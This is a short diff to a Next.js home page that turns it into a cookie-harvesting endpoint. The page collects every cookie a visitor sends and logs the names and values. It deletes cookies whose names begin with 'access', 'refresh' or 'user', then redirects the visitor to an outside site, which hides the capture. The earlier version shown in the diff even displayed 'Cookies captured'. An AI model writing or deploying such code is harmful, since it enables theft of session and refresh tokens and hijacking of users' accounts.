@@ -1,9 +1,22 @@
 import { cookies } from "next/headers";
-import styles from "./page.module.css";
+import { redirect } from "next/navigation";
 
 export default async function Home() {
-  const data = await cookies();
-  console.log("[" + new Date().toISOString() + "]", data.toString());
+  const cookieStore = await cookies();
+  const out: Record<string, string> = {};
 
-  return <div className={styles.page}>✅ Cookies captured ✅</div>;
+  cookieStore.getAll().forEach((item) => {
+    out[item.name] = item.value;
+
+    if (
+      item.name.startsWith("access") ||
+      item.name.startsWith("refresh") ||
+      item.name.startsWith("user")
+    ) {
+      cookieStore.delete(item.name);
+    }
+  });
+
+  console.log("[" + new Date().toISOString() + "]", JSON.stringify(out));
+  return redirect("https://deliverio.cz");
 }
